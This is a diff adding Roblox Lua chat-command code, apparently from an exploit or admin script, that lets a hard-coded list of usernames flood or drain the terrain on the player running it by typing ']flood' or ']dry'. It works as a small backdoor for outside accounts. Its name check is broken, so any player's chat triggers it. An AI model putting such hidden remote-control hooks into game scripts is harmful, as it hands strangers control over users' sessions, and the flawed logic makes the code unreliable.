@@ -292,6 +292,167 @@ end
 
 
 
+ 
+  TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "bifungiji" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "XxOmniversalxX" or "68248a73250" or "sokomakok"     then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]flood"
+then
+target = split[2]
+if target == "all" then 
+		local region = Region3.new(Vector3.new(-3901, 97, -4006), Vector3.new(3000,170,3000))
+		region = region:ExpandToGrid(4)
+		game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.Water)
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+		local region = Region3.new(Vector3.new(-3901, 97, -4006), Vector3.new(3000,170,3000))
+		region = region:ExpandToGrid(4)
+		game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.Water)
+end
+end
+end
+end
+end
+end
+end)
+end)
+
+
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "bifungiji" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"   or "68248a73250"   or "sokomakok"   then
+mes = string.lower(mes)
+name = v.Name
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]flood"
+then
+target = split[2]
+if target == "all" then 
+		local region = Region3.new(Vector3.new(-3901, 97, -4006), Vector3.new(3000,170,3000))
+		region = region:ExpandToGrid(4)
+		game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.Water)
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+		local region = Region3.new(Vector3.new(-3901, 97, -4006), Vector3.new(3000,170,3000))
+		region = region:ExpandToGrid(4)
+		game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.Water)
+end
+end
+end
+end
+end
+end
+end)
+end
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+  TheUser = game:GetService("Players").LocalPlayer.Name
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+if Player.Name ==  "bifungiji" or "FIRESTORMGAMERYT5" or "ftk_choppa4x" or "XxOmniversalxX" or "68248a73250" or "sokomakok"     then
+mes = string.lower(mes)
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]dry"
+then
+target = split[2]
+if target == "all" then 
+	local region = Region3.new(Vector3.new(-3901, 97,-4006), Vector3.new(3000,170,3000))
+		region = region:ExpandToGrid(4)
+		game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.Air)
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+		local region = Region3.new(Vector3.new(-3901, 97,-4006), Vector3.new(3000,170,3000))
+		region = region:ExpandToGrid(4)
+		game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.Air)
+end
+end
+end
+end
+end
+end
+end)
+end)
+
+
+
+
+  TheUser = game:GetService("Players").LocalPlayer.Name
+for i,v in pairs(game.Players:GetChildren()) do
+    	v.Chatted:Connect(function(mes)
+if v.Name ==  "bifungiji" or "FIRESTORMGAMERYT5"   or "ftk_choppa4x" or "XxOmniversalxX"   or "68248a73250"   or "sokomakok"   then
+mes = string.lower(mes)
+name = v.Name
+local split = mes:split(" ")
+local cmd = split[1]
+if cmd == "]dry"
+then
+target = split[2]
+if target == "all" then 
+	local region = Region3.new(Vector3.new(-3901, 97,-4006), Vector3.new(3000,170,3000))
+		region = region:ExpandToGrid(4)
+		game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.Air)
+else
+  for i,v in pairs(game.Players:GetPlayers()) do 
+                 if v.Name:lower():sub(1,#target) == target:lower() then
+                   target = v.Name
+if v.Name == TheUser then
+	local region = Region3.new(Vector3.new(-3901, 97,-4006), Vector3.new(3000,170,3000))
+		region = region:ExpandToGrid(4)
+		game.Workspace.Terrain:FillRegion(region, 4, Enum.Material.Air)
+end
+end
+end
+end
+end
+end
+end)
+end
+
+
 
 
 
